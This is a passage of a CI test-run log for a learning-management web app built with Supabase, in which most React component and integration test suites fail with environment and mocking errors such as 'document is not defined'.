2025-11-18T17:35:32.0638951Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mNavigation[2m > [22mshould allow direct navigation via question numbers[39m
2025-11-18T17:35:32.0639628Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0640486Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mAnswer Selection[2m > [22mshould allow selecting multiple choice answers[39m
2025-11-18T17:35:32.0641166Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0642865Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mAnswer Selection[2m > [22mshould allow entering text for open-ended questions[39m
2025-11-18T17:35:32.0644348Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0646362Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mAnswer Selection[2m > [22mshould show character count for open-ended questions[39m
2025-11-18T17:35:32.0647939Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0649609Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mTwo-Tier Feedback System[2m > [22mshould show tier 1 feedback on first incorrect attempt[39m
2025-11-18T17:35:32.0650795Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0652420Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mTwo-Tier Feedback System[2m > [22mshould show tier 2 feedback on second incorrect attempt[39m
2025-11-18T17:35:32.0653731Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0655283Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mTwo-Tier Feedback System[2m > [22mshould highlight incorrect questions in tier 2[39m
2025-11-18T17:35:32.0656513Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0658246Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuiz Submission[2m > [22mshould require all questions to be answered[39m
2025-11-18T17:35:32.0659406Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0660935Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuiz Submission[2m > [22mshould submit quiz when all answers are correct[39m
2025-11-18T17:35:32.0662097Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0663611Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuiz Submission[2m > [22mshould show completion screen without scores[39m
2025-11-18T17:35:32.0664753Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0666269Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuiz Submission[2m > [22mshould handle submission errors gracefully[39m
2025-11-18T17:35:32.0667732Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0669353Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuestion Randomization[2m > [22mshould randomize questions when enabled[39m
2025-11-18T17:35:32.0670565Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0672169Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mQuestion Randomization[2m > [22mshould randomize answer options when enabled[39m
2025-11-18T17:35:32.0673645Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0675028Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mTimer Display[2m > [22mshould display elapsed time[39m
2025-11-18T17:35:32.0676123Z [31m     → document is not defined[39m
2025-11-18T17:35:32.8198955Z  [33m❯[39m e2e/tests/backward-compatibility.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:33.5628793Z  [33m❯[39m e2e/tests/group-security.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:33.9418534Z [90mstdout[2m | unknown test[22m[39m
2025-11-18T17:35:33.9420004Z ✅ Learning Path Summary Performance Tests Completed
2025-11-18T17:35:33.9420837Z 
2025-11-18T17:35:33.9424380Z [90mstdout[2m | __tests__/integration/learning-path-summary-performance.test.ts[2m > [22m[2mLearning Path Summary Tables Performance[2m > [22m[2mPerformance Summary Table Queries[2m > [22m[2mshould query performance summaries efficiently[22m[39m
2025-11-18T17:35:33.9426383Z ✅ Performance summary query completed in 0.06ms
2025-11-18T17:35:33.9427061Z 
2025-11-18T17:35:33.9429306Z [90mstdout[2m | __tests__/integration/learning-path-summary-performance.test.ts[2m > [22m[2mLearning Path Summary Tables Performance[2m > [22m[2mPerformance Summary Table Queries[2m > [22m[2mshould query daily summaries for trend analysis efficiently[22m[39m
2025-11-18T17:35:33.9431473Z ✅ Daily summaries query completed in 0.04ms
2025-11-18T17:35:33.9431835Z 
2025-11-18T17:35:33.9434133Z [90mstdout[2m | __tests__/integration/learning-path-summary-performance.test.ts[2m > [22m[2mLearning Path Summary Tables Performance[2m > [22m[2mPerformance Summary Table Queries[2m > [22m[2mshould query user summaries for detailed analysis efficiently[22m[39m
2025-11-18T17:35:33.9435948Z ✅ User summaries query completed in 0.02ms
2025-11-18T17:35:33.9436258Z 
2025-11-18T17:35:33.9438696Z [90mstdout[2m | __tests__/integration/learning-path-summary-performance.test.ts[2m > [22m[2mLearning Path Summary Tables Performance[2m > [22m[2mAnalytics Calculations Performance[2m > [22m[2mshould calculate overview analytics quickly using pre-aggregated data[22m[39m
2025-11-18T17:35:33.9440757Z ✅ Overview analytics calculated in 0.11ms
2025-11-18T17:35:33.9441111Z 
2025-11-18T17:35:33.9443398Z [90mstdout[2m | __tests__/integration/learning-path-summary-performance.test.ts[2m > [22m[2mLearning Path Summary Tables Performance[2m > [22m[2mAnalytics Calculations Performance[2m > [22m[2mshould identify at-risk users efficiently from user summaries[22m[39m
2025-11-18T17:35:33.9444729Z ✅ At-risk user analysis completed in 0.05ms
2025-11-18T17:35:33.9444944Z 
2025-11-18T17:35:33.9446114Z [90mstdout[2m | __tests__/integration/learning-path-summary-performance.test.ts[2m > [22m[2mLearning Path Summary Tables Performance[2m > [22m[2mSummary Table Update Performance[2m > [22m[2mshould simulate efficient summary table updates[22m[39m
2025-11-18T17:35:33.9447505Z ✅ Summary table updates completed in 0.04ms
2025-11-18T17:35:33.9447704Z 
2025-11-18T17:35:33.9449922Z [90mstdout[2m | __tests__/integration/learning-path-summary-performance.test.ts[2m > [22m[2mLearning Path Summary Tables Performance[2m > [22m[2mQuery Optimization Validation[2m > [22m[2mshould prefer summary tables over raw session queries[22m[39m
2025-11-18T17:35:33.9451565Z ✅ Optimized queries using summary tables in 0.13ms
2025-11-18T17:35:33.9451968Z 
2025-11-18T17:35:33.9453400Z [90mstdout[2m | __tests__/integration/learning-path-summary-performance.test.ts[2m > [22m[2mLearning Path Summary Tables Performance[2m > [22m[2mQuery Optimization Validation[2m > [22m[2mshould validate that summary tables provide complete data coverage[22m[39m
2025-11-18T17:35:33.9455111Z ✅ Summary tables provide complete data coverage
2025-11-18T17:35:33.9455496Z 
2025-11-18T17:35:33.9456592Z  [32m✓[39m __tests__/integration/learning-path-summary-performance.test.ts [2m ([22m[2m8 tests[22m[2m)[22m[90m 14[2mms[22m[39m
2025-11-18T17:35:34.7063818Z  [33m❯[39m e2e/tests/student-groups.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:35.1190725Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:35.1197577Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:35.1200745Z 
2025-11-18T17:35:35.2119008Z  [33m❯[39m __tests__/integration/assignmentOverview.test.js [2m ([22m[2m7 tests[22m [2m|[22m [31m7 failed[39m[2m)[22m[90m 39[2mms[22m[39m
2025-11-18T17:35:35.2121890Z [31m   [33m❯[31m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould display correct assignments for admin with no filters[39m
2025-11-18T17:35:35.2123804Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:35.2126080Z [31m   [33m❯[31m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould filter assignments by school correctly[39m
2025-11-18T17:35:35.2128118Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:35.2130731Z [31m   [33m❯[31m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould show consultant-specific assignments[39m
2025-11-18T17:35:35.2132441Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:35.2137638Z [31m   [33m❯[31m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould handle pagination correctly with filters[39m
2025-11-18T17:35:35.2139372Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:35.2141514Z [31m   [33m❯[31m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould calculate submission statistics correctly[39m
2025-11-18T17:35:35.2143191Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:35.2145336Z [31m   [33m❯[31m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mFilter interdependencies[2m > [22mshould show only communities belonging to selected school[39m
2025-11-18T17:35:35.2147216Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:35.2149338Z [31m   [33m❯[31m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mFilter interdependencies[2m > [22mshould clear generation filter when school changes[39m
2025-11-18T17:35:35.2151015Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:35.7230926Z  [33m❯[39m __tests__/components/blocks/BibliographyBlockEditor.test.tsx [2m ([22m[2m17 tests[22m [2m|[22m [31m17 failed[39m[2m)[22m[90m 22[2mms[22m[39m
2025-11-18T17:35:35.7234902Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mrenders correctly in edit mode[39m
2025-11-18T17:35:35.7236292Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7237822Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mallows editing title and description[39m
2025-11-18T17:35:35.7238911Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7240200Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22madds a new PDF item[39m
2025-11-18T17:35:35.7241631Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7242905Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22madds a new link item[39m
2025-11-18T17:35:35.7243897Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7245140Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mdisplays existing items[39m
2025-11-18T17:35:35.7246542Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7249716Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mdeletes an item[39m
2025-11-18T17:35:35.7251891Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7255254Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mtoggles show categories option[39m
2025-11-18T17:35:35.7256739Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7258482Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mchanges sort order[39m
2025-11-18T17:35:35.7261214Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7263661Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mhandles file upload for PDF[39m
2025-11-18T17:35:35.7264939Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7266555Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mvalidates PDF file types[39m
2025-11-18T17:35:35.7268034Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7269668Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mEdit Mode[2m > [22mhas file size validation[39m
2025-11-18T17:35:35.7270895Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7272612Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mPreview Mode[2m > [22mrenders correctly in preview mode[39m
2025-11-18T17:35:35.7273916Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7275592Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mPreview Mode[2m > [22mshows empty state when no items[39m
2025-11-18T17:35:35.7277062Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7278864Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mPreview Mode[2m > [22mdisplays correct icons for different item types[39m
2025-11-18T17:35:35.7280251Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7281891Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mItem Management[2m > [22mmoves items up and down[39m
2025-11-18T17:35:35.7283241Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7285110Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mItem Management[2m > [22mexpands and collapses items with edit button[39m
2025-11-18T17:35:35.7286537Z [31m     → document is not defined[39m
2025-11-18T17:35:35.7288535Z [31m   [33m❯[31m __tests__/components/blocks/BibliographyBlockEditor.test.tsx[2m > [22mBibliographyBlockEditor[2m > [22mItem Management[2m > [22mshows author and year in collapsed view[39m
2025-11-18T17:35:35.7289938Z [31m     → document is not defined[39m
2025-11-18T17:35:36.4714719Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:36.4717105Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:36.4718303Z 
2025-11-18T17:35:37.3378414Z  [33m❯[39m __tests__/contracts/invoice-deletion.test.tsx [2m ([22m[2m12 tests[22m [2m|[22m [31m12 failed[39m[2m)[22m[90m 15[2mms[22m[39m
2025-11-18T17:35:37.3383994Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mrenders delete button for existing invoices[39m
2025-11-18T17:35:37.3385672Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3386202Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3387815Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mshows custom confirmation modal when delete button is clicked[39m
2025-11-18T17:35:37.3388788Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3389265Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3390800Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mcloses confirmation modal when cancel is clicked[39m
2025-11-18T17:35:37.3391675Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3392129Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3393331Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mcalls onDeleteInvoice when confirmation is clicked[39m
2025-11-18T17:35:37.3394193Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3394640Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3395859Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mdisplays enhanced file information[39m
2025-11-18T17:35:37.3397673Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3398567Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3400739Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mshows loading spinner during deletion[39m
2025-11-18T17:35:37.3402157Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3402888Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3404940Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mhides invoice immediately on deletion (optimistic update)[39m
2025-11-18T17:35:37.3406352Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3407351Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3409414Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22msuccessfully deletes invoice from storage and database[39m
2025-11-18T17:35:37.3410854Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3411633Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3413631Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22mhandles deletion error gracefully[39m
2025-11-18T17:35:37.3415302Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3416108Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3418474Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22mextracts file path correctly from various URL formats[39m
2025-11-18T17:35:37.3419922Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3420720Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3422414Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mFile Upload Validation[2m > [22mvalidates file type on upload[39m
2025-11-18T17:35:37.3423663Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3424459Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:37.3426240Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mFile Upload Validation[2m > [22mvalidates file size on upload[39m
2025-11-18T17:35:37.3427802Z [31m     → supabase is not defined[39m
2025-11-18T17:35:37.3428784Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:38.1391279Z  [33m❯[39m e2e/tests/rbac-production-ready.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:38.1399019Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:38.1402651Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:38.1404031Z 
2025-11-18T17:35:38.5252795Z  [32m✓[39m lib/utils/__tests__/lessonProgressUtils.test.ts [2m ([22m[2m34 tests[22m[2m)[22m[90m 14[2mms[22m[39m
2025-11-18T17:35:39.1487308Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:39.1491135Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:39.1492748Z 
2025-11-18T17:35:39.3779121Z  [33m❯[39m __tests__/contracts/invoice-deletion.integration.test.tsx [2m ([22m[2m3 tests[22m [2m|[22m [31m3 failed[39m[2m)[22m[90m 10[2mms[22m[39m
2025-11-18T17:35:39.3782286Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mcomplete invoice deletion flow with optimistic updates[39m
2025-11-18T17:35:39.3784146Z [31m     → useRouter.mockReturnValue is not a function[39m
2025-11-18T17:35:39.3785140Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:39.3788172Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mhandles deletion failure and reverts optimistic update[39m
2025-11-18T17:35:39.3789161Z [31m     → useRouter.mockReturnValue is not a function[39m
2025-11-18T17:35:39.3789710Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:39.3790750Z [31m   [33m❯[31m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mkeyboard navigation and accessibility[39m
2025-11-18T17:35:39.3791558Z [31m     → useRouter.mockReturnValue is not a function[39m
2025-11-18T17:35:39.3792089Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:39.8691503Z  [33m❯[39m __tests__/components/student/BibliographyBlockRenderer.test.tsx [2m ([22m[2m20 tests[22m [2m|[22m [31m20 failed[39m[2m)[22m[90m 24[2mms[22m[39m
2025-11-18T17:35:39.8695851Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mrenders bibliography block with title and description[39m
2025-11-18T17:35:39.8700427Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8702227Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mrenders all bibliography items[39m
2025-11-18T17:35:39.8703101Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8704194Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mdisplays author and year information[39m
2025-11-18T17:35:39.8705029Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8706066Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mdisplays item descriptions[39m
2025-11-18T17:35:39.8707661Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8710112Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mBasic Rendering[2m > [22mshows correct badges for PDF and link types[39m
2025-11-18T17:35:39.8711782Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8713600Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mEmpty State[2m > [22mshows empty state when no items[39m
2025-11-18T17:35:39.8714908Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8716748Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mSorting[2m > [22msorts items by title when sortBy is set to title[39m
2025-11-18T17:35:39.8718398Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8720139Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mSorting[2m > [22msorts items by author[39m
2025-11-18T17:35:39.8721439Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8723230Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mSorting[2m > [22msorts items by year (newest first)[39m
2025-11-18T17:35:39.8724569Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8726532Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mCategories[2m > [22mgroups items by category when showCategories is true[39m
2025-11-18T17:35:39.8728158Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8730203Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mCategories[2m > [22mshows items without category headers when showCategories is false[39m
2025-11-18T17:35:39.8731730Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8733471Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mInteraction[2m > [22mopens links in new tab[39m
2025-11-18T17:35:39.8734789Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8736737Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mInteraction[2m > [22mcalls onComplete when continue button is clicked[39m
2025-11-18T17:35:39.8738439Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8740210Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mInteraction[2m > [22mshows completed state[39m
2025-11-18T17:35:39.8741813Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8743721Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mInteraction[2m > [22mtracks time spent via progress updates[39m
2025-11-18T17:35:39.8745139Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8747158Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mAccessibility[2m > [22mhas proper heading hierarchy[39m
2025-11-18T17:35:39.8748600Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8750427Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mAccessibility[2m > [22mprovides descriptive link text[39m
2025-11-18T17:35:39.8751845Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8753740Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mEdge Cases[2m > [22mhandles items without optional fields[39m
2025-11-18T17:35:39.8755139Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8757584Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mEdge Cases[2m > [22mhandles items with "Sin categoría" when categories are shown[39m
2025-11-18T17:35:39.8759168Z [31m     → document is not defined[39m
2025-11-18T17:35:39.8761001Z [31m   [33m❯[31m __tests__/components/student/BibliographyBlockRenderer.test.tsx[2m > [22mBibliography Block - Student View[2m > [22mEdge Cases[2m > [22mhandles missing title gracefully[39m
2025-11-18T17:35:39.8762398Z [31m     → document is not defined[39m
2025-11-18T17:35:40.3719281Z  [33m❯[39m __tests__/components/feedback/FeedbackModal.test.tsx [2m ([22m[2m14 tests[22m [2m|[22m [31m14 failed[39m[2m)[22m[90m 16[2mms[22m[39m
2025-11-18T17:35:40.3723690Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mdoes not render when closed[39m
2025-11-18T17:35:40.3725170Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3726166Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3727741Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mrenders when open[39m
2025-11-18T17:35:40.3728541Z [31m     → vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:35:40.3729080Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:40.3729953Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas description textarea[39m
